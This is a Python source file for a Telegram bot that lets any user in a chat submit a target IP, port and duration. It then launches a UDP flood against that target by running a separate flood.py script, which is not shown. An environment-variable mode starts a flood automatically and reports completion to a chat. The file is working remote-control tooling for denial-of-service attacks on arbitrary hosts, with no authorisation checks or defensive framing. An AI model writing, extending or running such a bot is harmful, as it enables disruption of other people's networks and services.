import subprocess
import sys
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send target details: IP PORT DURATION (in seconds)\nExample: 192.168.1.100 12345 60")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        parts = update.message.text.strip().split()
        if len(parts) != 3:
            await update.message.reply_text("Invalid format. Use: IP PORT DURATION\nExample: 192.168.1.100 12345 60")
            return

        ip, port_str, duration_str = parts
        port = int(port_str)
        duration = int(duration_str)

        if duration <= 0 or duration > 3600:
            await update.message.reply_text("Duration must be between 1 and 3600 seconds.")
            return

        await update.message.reply_text(f"Starting UDP flood on {ip}:{port} for {duration} seconds...")
        proc = subprocess.Popen([sys.executable, "flood.py", ip, str(port), str(duration)])
        proc.wait()
        await update.message.reply_text(f"UDP flood on {ip}:{port} for {duration}s completed!")

    except ValueError:
        await update.message.reply_text("Port and duration must be numbers.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

def main():
    if os.getenv("IP") and os.getenv("PORT") and os.getenv("DURATION"):
        from telegram import Bot
        ip = os.getenv("IP")
        port = int(os.getenv("PORT"))
        duration = int(os.getenv("DURATION"))
        subprocess.run([sys.executable, "flood.py", ip, str(port), str(duration)])
        bot = Bot(os.getenv("BOT_TOKEN"))
        bot.send_message(chat_id=os.getenv("CHAT_ID"), text=f"Auto-flood complete on {ip}:{port} for {duration}s")
        sys.exit(0)

    app = Application.builder().token(os.getenv("BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling(timeout=300)

if __name__ == "__main__":
    main()
